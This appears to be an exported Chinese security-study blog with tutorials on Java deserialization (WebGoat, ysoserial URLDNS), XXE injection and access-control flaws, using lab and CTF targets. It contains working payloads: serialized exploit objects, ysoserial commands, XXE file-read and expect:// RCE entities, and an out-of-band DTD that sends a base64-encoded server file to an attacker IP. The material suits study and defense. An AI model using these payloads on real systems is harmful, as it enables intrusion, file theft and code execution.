向您的项目添加足够的测试用例以验证无效令牌实际上不起作用。与第三方集成以检查您的令牌并不意味着您根本没有测试您的应用程序。","categories":[{"name":"JAVA安全基础","slug":"JAVA安全基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"渗透测试基础","slug":"JAVA安全基础/渗透测试基础","permalink":"https://j3f5.github.io/categories/JAVA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"JWT","slug":"JWT","permalink":"https://j3f5.github.io/tags/JWT/"}]},{"title":"反序列化漏洞基础","slug":"反序列化漏洞基础","date":"2023-06-07T03:39:32.000Z","updated":"2023-06-07T03:39:32.000Z","comments":true,"path":"articles/2023/06/07/反序列化漏洞基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","excerpt":"","text":"JAVA反序列化 概念 序列化与反序列化 Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。 Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。 序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 例子： 最常见的反序列化情况便是服务器的SESSION，当有大量用户并发访问，就有可能出现庞大数量的SESSION 对象，内存显然不够用，于是Web 容器便会将SESSION 先序列化到硬盘中，等需要使用时，再将保存在硬盘中的对象还原到内存中，这个存储再拿出来的过程便是序列化和反序列化的过程。 漏洞成因与危害 成因：Java 程序没有对反序列化生成的对象的类型做限制。在 Java 中反序列化漏洞之所以比较严重的原因之一是：Java 存在大量的公用库，例如Apache Commons Collections。而这其中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 这些应用的反序列化漏洞能够得以利用，便是依靠了Apache Commons Collections。当然反序列漏洞的根源并不在于公共库，他只是手段与途径。 危害：任意代码执行，获取SHELL，对服务器进行破坏。 涉及函数 ObjectOutputStream 类 writeObject() 方法可以对参数指定的obj 对象进行序列化操作，并将得到的字节序列写到目标输出流中。 ReadObject()方法则是从源输入流中读取字节序列，再将其反序列化为对象并返回。 可以序列化反序列化的类都需要声明接口Serializable 漏洞利用的条件 存在利用链 在程序中，通过方法调用、对象传递和反射机制等手段作为跳板，攻击者能构造出一个产生安全问题的利用链，如任意文件读取或写入、远程代码执行等漏洞。利用链又称作Gadget chain，利用链的构造往往由多个类对象组成，环环相扣就像一个链条。 存在触发点 程序中仅有一条利用链或者仅有一个反序列化的触发点都不会造成安全问题，不能被认定为漏洞。需要存在入口以及触发漏洞的函数。 序列化字符串 下方的特征可以作为序列化的标志参考： 一段以rO0AB开头，基本可以确认是JAVA序列化字符串以base64加密的数据。 序列化+base64 一段以aced开头，基本就是JAVA序列化的16进制数据 测试用例（WebGoat与ysoserial） 基础反序列化 著名含反序列化漏洞的代码： 123InputStream is = request.getInputStream();ObjectInputStream ois = new ObjectInputStream(is);AcmeObject acme = (AcmeObject)ois.readObject(); 它期待着一个AcmeObject对象，但它会在铸造发生之前执行readObject()。如果攻击者找到了在readObject()中实现危险操作的适当的类，他可以将该对象序列化，并强迫受攻击的应用程序执行这些操作。攻击者需要在classpath中找到一个支持序列化并在readObject()上有危险实现的类。【也就是利用链】 12345678910111213141516171819202122232425262728293031package org.dummy.insecure.framework;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.ObjectInputStream;import java.io.Serializable;import java.time.LocalDateTime;public class VulnerableTaskHolder implements Serializable &#123; private static final long serialVersionUID = 1; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) &#123; super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); &#125; private void readObject( ObjectInputStream stream ) throws Exception &#123; //deserialize data so taskName and taskAction are available stream.defaultReadObject(); //blindly run some code. #code injection Runtime.getRuntime().exec(taskAction); &#125;&#125; 如果上图所示的java类存在，攻击者可以将该对象序列化并获得远程代码执行。利用链如下：用户定义了一个VulnerableTaskHolder对象Go，然后传入对应的参数值，对我们构造的恶意对象进行序列化，将会出发Runtime.getRuntime().exec(taskAction);。 1234567VulnerableTaskHolder go = new VulnerableTaskHolder(&quot;delete all&quot;, &quot;rm -rf somefile&quot;);ByteArrayOutputStream bos = new ByteArrayOutputStream();ObjectOutputStream oos = new ObjectOutputStream(bos);oos.writeObject(go);oos.flush();byte[] exploit = bos.toByteArray(); ysoserial样例分析（URLDNS样例） 这个是https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java的一个项目，按照别人的payload来学习某个模块是否存在反序列化漏洞。 主要代码如下： 12345678public Object getObject(String url) throws Exception &#123; URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); URL u = new URL((URL)null, url, handler); ht.put(u, url); Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); return ht;&#125; 这里面涉及几个类，一个是URL一个是HashMap。先循序渐进，看类与方法。怎么看类？找readObject和writeObject类看到两个个类，HashMap有readObject方法。 看到一个方法put，那就ctrl+b进去 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 这里有两个函数，一个putVal，一个是hash，现在进去putVal 12345678 final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) &#123; Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length;.... return null; &#125; 没啥，涉及到的函数都是与树相关的操作，就是存储吧，所以返回hash方法，这个方法传入的是key的 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; key是URL的，所以去到URL类看看hashCode 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 需要hashCode==-1才能执行后面的hashCode函数，跟进hashcode函数 1234567891011121314151617protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; 发现InetAddress addr = getHostAddress(u)可以获取URL的IP地址就是域名解析。 我其实跑偏了：正确是先找readObject。 当我们传入序列化的数据时，因为HashMap有readObject函数，所以跟进一下： 12345678910111213141516 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize();....... // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125; &#125; 发现putVal(hash(key), key, value, false, false);这个，上面已经分析过。所以 所以利用链就是： 存在URL和Hashmap Hashmap重写了readObject方法，里面，使用putVal函数的时候会调用hash函数对URL进行hashCode处理 URL的hashcode函数调用getHostAddress进行域名解析 所以现在模仿写一个： 12345678910111213141516171819202122232425262728293031323334353637383940package com.urldns;import java.io.*;import java.lang.reflect.Field;import java.net.MalformedURLException;import java.net.URL;import java.util.HashMap;public class URLDNS &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123; /* ERROR 1. Unable to make field private int java.net.URL.hashCode accessible: module java.base does not &quot;opens -- Java version is too high 2. has been compiled by a more recent version of the Java Runtime (class file version 52.0) -- Java version is too high. Please reset the project structure and the configuration */ String sUrl = &quot;http://ib7pmo.dnslog.cn&quot;; URL uUrl = new URL(sUrl); HashMap hashMap = new HashMap(); // 这里获取URL类的字段，这里列举两种方法 Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); // Field field = uUrl.getClass().getDeclaredField(&quot;hashCode&quot;); // 因为是私有方法，所以这里设置能更改 field.setAccessible(true); // 为了不混淆，这里put方法也可以造成dnslog的，所以设置2 field.set(uUrl, 2); hashMap.put(uUrl, &quot;J3ff&quot;); // 存起来了，后面就可以用了 field.set(uUrl, -1); // 开始序列化 ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;urldns.exp&quot;)); objectOutputStream.writeObject(hashMap); // 反序列化 ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;urldns.exp&quot;)); objectInputStream.readObject(); &#125;&#125; webgoat 反序列化漏洞分析 and ysoserial的使用 现在查到这个有漏洞的类代码为： 1234567891011121314151617181920212223public class InsecureDeserializationTask extends AssignmentEndpoint &#123; public InsecureDeserializationTask() &#123; &#125; @PostMapping(&#123;&quot;/InsecureDeserialization/task&quot;&#125;) @ResponseBody public AttackResult completed(@RequestParam String token) throws IOException &#123; // 对接收到的token进行了一波敏感字符替换变成b64token String b64token = token.replace(&#x27;-&#x27;, &#x27;+&#x27;).replace(&#x27;_&#x27;, &#x27;/&#x27;); long before;long after; try &#123; label71: &#123; // 对b64token解码过后进行了readObject()反序列化操作（第16行） ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token))); // ... before = System.currentTimeMillis(); Object o = ois.readObject(); // 看这个对象是不是VulnerableTaskHolder的实例 if (!(o instanceof VulnerableTaskHolder)) &#123; // ... after = System.currentTimeMillis(); // ... // 看执行了多久，时间长了就算成功 int delay = (int)(after - before); // ... 就如上面代码所示，我们应该看VulnerableTaskHolder类，里面的readObject()反序列化操作到底有什么可以利用的。 123456789101112131415161718192021222324252627282930313233343536373839public class VulnerableTaskHolder implements Serializable &#123; private static final long serialVersionUID = 2; private String taskName; private String taskAction; private LocalDateTime requestedExecutionTime; public VulnerableTaskHolder(String taskName, String taskAction) &#123; super(); this.taskName = taskName; this.taskAction = taskAction; this.requestedExecutionTime = LocalDateTime.now(); &#125; @Override public String toString() &#123; return &quot;VulnerableTaskHolder [taskName=&quot; + taskName + &quot;, taskAction=&quot; + taskAction + &quot;, requestedExecutionTime=&quot; + requestedExecutionTime + &quot;]&quot;; &#125; // 执行反序列化操作 private void readObject(ObjectInputStream stream) throws Exception &#123; // 反序列化中的taskName和taskAction属性都是可以利用的 stream.defaultReadObject(); // 对数据进行操作的记录 ... // 对象误操作 ... // 注释：这里的条件是为了防止你把山羊完全毁掉 if ((taskAction.startsWith(&quot;sleep&quot;) || taskAction.startsWith(&quot;ping&quot;)) &amp;&amp; taskAction.length() &lt; 22) &#123; log.info(&quot;about to execute: &#123;&#125;&quot;, taskAction); try &#123; // 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中 Process p = Runtime.getRuntime().exec(taskAction); BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream())); String line = null; while ((line = in.readLine()) != null) &#123; log.info(line); &#125; &#125; catch (IOException e) &#123; log.error(&quot;IO Exception&quot;, e);&#125;&#125;&#125;&#125; 执行Runtime.getRuntime().exec(taskAction); 所以把攻击的恶意代码写到 taskAction 类中，所以构造payload的java文件（目录为src文件夹中，org.dummy.insecure.framework文件夹下的Main文件）： 1234567891011121314package org.dummy.insecure.framework;import java.io.*;import java.util.Base64;public class Main &#123; public static void main(String[] args) throws IOException&#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); VulnerableTaskHolder vulnerableTaskHolder = new VulnerableTaskHolder(&quot;ping&quot;, &quot;ping -n 6 127.0.0.1&quot;); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(vulnerableTaskHolder); String str = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); System.out.println(str); outputStream.close(); &#125;&#125; 然后把VulnerableTaskHolder.java也弄到这里去：目录为src文件夹中，org.dummy.insecure.framework文件夹下，注意删掉错误的部分。运行即可。 1rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAfnBgYRFBgzn0lIeHQAE3BpbmcgLW4gNiAxMjcuMC4wLjF0AARwaW5n 所以我们要构造的恶意代码应该遵循：恶意命令→序列化→base64→rO0AB格式字符串【最终Payload】 当然，我们可以使用DNSlog测试：VulnerableTaskHolder vuln = new VulnerableTaskHolder(&quot;qwq&quot;,&quot;ping ***.dnslog.cn&quot;); 这个恶意命令一般是反弹shell，因为考虑到有的不回显。 ysoserial 可以看到里面有很多组件，选择其中的一个，然后通过他给出的指令： 1Usage: java -jar ysoserial-[version]-all.jar [payload] &#x27;[command]&#x27; 我们找到需要的组件，然后生成即可： 1java -jar .\\ysoserial.jar Hibernate1 calc.exe &gt; payload.bin PHP反序列化 PHP反序列化不是本章的重点，所以浅浅说一下，这里面的序列化结构如下： 具体可以参考如下导图做简单的复习： 参考： https://xz.aliyun.com/t/12507#toc-11","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://j3f5.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"DNSlog数据外带在各种攻击的利用方式（无回显）","slug":"DNSlog数据外带在各种攻击的利用方式（无回显）","date":"2023-06-06T02:09:43.000Z","updated":"2023-06-06T02:09:43.000Z","comments":true,"path":"articles/2023/06/06/DNSlog数据外带在各种攻击的利用方式（无回显）/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/06/DNSlog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6%E5%9C%A8%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89/","excerpt":"","text":"","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"RCE","slug":"RCE","permalink":"https://j3f5.github.io/tags/RCE/"},{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"}]},{"title":"XXE与XML的利用与绕过","slug":"XXE与XML的利用与绕过","date":"2023-06-05T13:48:11.000Z","updated":"2023-06-05T13:48:11.000Z","comments":true,"path":"articles/2023/06/05/XXE与XML的利用与绕过/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/05/XXE%E4%B8%8EXML%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%95%E8%BF%87/","excerpt":"","text":"基础知识 XML XML 被设计为传输和存储数据，XML 文档结构包括 XML 声明 DTD 文档类型定义（可选） 文档元素 其焦点是数据的内容，其把数据从 HTML 分离，是独立于软件和硬件的信息传输工具。 XXE XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。 XML 与 HTML 的主要差异 XML 被设计为传输和存储数据，其焦点是数据的内容。 HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息 ，而 XML 旨在传输信息。 XML文档格式 其中DOCTYPE是DTD的声明；ENTITY是DDT实体的声明，所谓实体可以理解为变量。SYSTEM、PUBLIC是外部资源的申请。看到SYSTEM后面的文件是可以指向文件的，如果可以被我们控制，那么我们就可以读取服务器文件信息，或者远程文件。 123456789101112131415161718&lt;!--XML 声明--&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义 note 元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义 to 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!-- 定义 from 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!-- 定义 head 元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!-- 定义 body 元素为”#PCDATA”类型--&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 外部实体 --&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTD声明 文档类型定义（DTD）可定义合法的 XML 文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用 1234&lt;!-- 内部的 DOCTYPE 声明 --&gt;&lt;!DOCTYPE 根元素 [元素声明]&gt;&lt;!-- 外部文档声明 --&gt;&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt; DTD 实体 内部实体 略 外部实体（通用实体） 外部实体表示外部文件的内容，用 SYSTEM 关键词表示，通常使用 &lt;!DOCTYPE 根元素 SYSTEM “文件名&quot;&gt; &lt;!DOCTYPE 根元素 PUBLIC “public_ID&quot; “文件名&quot;&gt; 的形式引用外部实体。 参数实体 使用 % 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用 只有在DTD文件中，参数实体的声明才能引用其他实体 和通用实体一样，参数实体也可以外部引用 123&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;%an-element;%remote-dtd; 举例子（java） 1234567891011121314151617181920&lt;!-- 内部实体声明 --&gt;&lt;!ENTITY 实体名称 ”实体的值”&gt;&lt;!-- 外部实体声明 --&gt;&lt;!ENTITY 实体名称 SYSTEM ”URI”&gt;&lt;!-- 参数实体声明 --&gt;&lt;!ENTITY %实体名称 ”实体的值”&gt;&lt;!ENTITY %实体名称 SYSTEM ”URI”&gt;&lt;!-- 举例内部实体 --&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 举例外部实体 --&gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1/kk.php&quot;&gt; &lt;!-- 举例内部实体 --&gt;&lt;!ENTITY xxe &quot;test&quot;&gt; &lt;!-- 引用实体 --&gt;&lt;credit&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/credit&gt; 用图解释一下： 而JAVA是怎么把它变成对象的呢？在Java应用程序中，XML可以用来从客户端获取数据到服务器，我们都熟悉JSON apis，我们也可以用xml来获取信息。大多数情况下，框架会根据xml结构自动填充Java对象，例如： 注入攻击 XML注入攻击（内部实体攻击） 为什么要提XML注入呢，我们从XXE的全称（XML外部实体注入）可以看出，XXE也是一种XML注入，只不过注入的是XML外部实体罢了，所以看一下。看到，就是插入了一个数据，跟sql啥的一般无二，但是得注意标头是怎么样的，实际上没什么用。 服务器解析xml的php代码： 12345678&lt;?php libxml_disable_entity_loader (false); $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); echo $creds;?&gt; 其中libxml_disable_entity_loader（BOOL）函数接收true或false两种布尔型参数，用来表示是否允许禁用外部加载实体，当值为false时允许加载外部实体；通过file_get_contents()加载传入的参数，再通过DOMDocument类中的loadXML函数加载外部传入的实体（XML），最后将结果返回显示。 XXE 因此我们构造一个XML外部实体，用来访问服务器上的敏感文件，然后再数据传输过程中将自己的实体注入。 读文件 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 绕过 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 通过各种协议绕过 内网探针或攻击内网应用（难利用） 实际应用中基本碰不到（触发漏洞地址），因为有前提条件： 内网IP地址 开放端口 存在xxe漏洞 构造漏洞地址 RCE（难利用） 该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令 实际应用中很难碰到 12345&lt;?xml version = &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt; 引入外部实体 dtd 条件： 观察是否禁止外部实体引入（有点像本地包含与远程包含） 引入外部实体的原因： 自定义攻击代码 绕过恶意代码检测 代码： 123456&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;%file;]&gt;&lt;x&gt;&amp;send;&lt;/x&gt; evil2.dtd: 1&lt;!ENTITY send SYSTEM &quot;file:///d:/test.txt&quot;&gt; 无回显读文件 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/test.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:80/evil2.dtd&quot;&gt;%dtd;%send;]&gt; evil2.dtd 1234&lt;!ENTITY % payload&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://127.0.0.1:80/?data=%file;&#x27;&gt;&quot;&gt;%payload; 无回显读文件——外带数据（可dnslog） 操作： 服务器处理XML源代码 123456&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);?&gt; payload 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://my.local.cn/test.dtd&quot;&gt;%remote;%int;%send;]&gt; 再提交数据的时候引用另一个DTD文件，test.dtd将服务器上的敏感文件进行base64编码后转发给攻击者ip：9999端口上 test.dtd （来自你的恶意dtd，在你的服务器里面） 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/windows/system.ini&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.210.37:9999?p=%file;&#x27;&gt;&quot;&gt; 我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程主机上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。 进一步对XXE漏洞分析后，我们可以很清晰地看到我们实际上都是通过file协议读取本地文件，或者通过http协议发出请求，类比一下其他漏洞例如SSRF，发现这两种漏洞的利用方式非常相似，因为他们都是从服务器向另一台服务器发起请求，所以想要更进一步的利用XXE漏洞我们要清楚在何种平台可以使用何种协议： libxml2 PHP JAVA .NET filehttpftp filehttpftpphpcompress.zlibcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * filehttphttpsftp 防御 使用开发语言提供的禁用外部实体的方法 123456789PHP： libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()；dbf.setExpandEntityReferences(false);Python: from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC 使用第三方应用代码及时升级补丁 实操 发现漏洞 从上面可以看到：XML的数据传输。则在传输数据的地方贴上payload。 123456789&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM &quot;file:///e:/you.txt&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;test;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;&lt;!-- 注： file:///c:/ 和 file:/// 分别是windows 和 Linux的r--&gt;&lt;!-- 回显 --&gt;what?(我的文本) 更改类型（盲猜） 原代码 12345678910111213POST /api/v1.0/try HTTP/1.1Host: web.jarvisoj.com:9882Content-Length: 36User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Content-Type: application/jsonAccept: */*Origin: http://web.jarvisoj.com:9882Referer: http://web.jarvisoj.com:9882/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#123;&quot;search&quot;:&quot;type sth!&quot;,&quot;value&quot;:&quot;own&quot;&#125; 改 123456789101112131415161718POST /api/v1.0/try HTTP/1.1Host: web.jarvisoj.com:9882Content-Length: 104User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36Content-Type: application/xmlAccept: */*Origin: http://web.jarvisoj.com:9882Referer: http://web.jarvisoj.com:9882/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Mikasa [&lt;!ENTITY test SYSTEM &quot;file:///flag.txt&quot;&gt;]&gt;&lt;x&gt;&amp;test;&lt;/x&gt; JAVA webgoat","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XXE","slug":"XXE","permalink":"https://j3f5.github.io/tags/XXE/"}]},{"title":"逻辑漏洞","slug":"逻辑漏洞","date":"2023-06-03T02:40:31.000Z","updated":"2023-06-03T02:40:31.000Z","comments":true,"path":"articles/2023/06/03/逻辑漏洞/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/03/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"水平垂直越权 概念 水平：A与B是同一个权限，但是A可以访问B的数据 垂直：B是高权限用户，而A是低权限，A可以访问B的数据 未授权访问：通过删除请求中的认证信息后，发起 重放攻击 仍然可以访问或者完成操作 挖洞关键 找到功能点，当然也可能不是功能点，就是刷新之后返回的一些信息，通过各种参数查询数据库啥的，抓包一个个放，然后看有什么可以利用的 抓包查看有什么地方可以修改的，例如如下card_id、uid等等都是可以改的 12345678910GET /json.php?card_id=20128880322 HTTP/1.1Host: 124.70.64.48:47325User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeReferer: http://124.70.64.48:47325/user_info.phpCookie: PHPSESSID=2a14ujvvjk9puum9qvpelkaae2; uid=test; mid=6927071f788211ee17211be0b89ef1e6Cache-Control: max-age=0 去找你想要相关User的信息，一般可以通过头像的命名方式之类的，与card_id有关系的命名，然后得到一些信息。改一下就重新发包，观察得到了什么信息。 所以总结一下，一些Uid啥的都是很有用的，需要注意搜集 水平越权操作 看一下A中可以实现的功能，然后，抓包。【例如：账户名Kobe，然后有个查看信息的操作】 看抓包中的参数，更改参数。【例如想查看账户Lucy的详细信息，更改http://.../?name=kobe&amp;submit=...中kobe变成lucy】 怎么知道有Lucy这个人？信息搜集+注册框显示是否存在此用户+访问其他个人空间查看用户名 如果返回成功，那就存在水平越权 垂直越权操作 先去admin界面操作并抓到包/看到相关界面（例如在普通用户界面有的按钮是灰色，然后猜解数据包的构成） 更换猜解/抓到的admin操作数据包，然后替换普通用户的cookie 如果操作成功，那就存在垂直越权漏洞 前提条件：（获取admin的操作数据包，那么怎么来的数据包？） 普通用户前端有操作界面可以抓取操作数据包 通过网站源码本地搭建模拟抓取 盲猜 原理 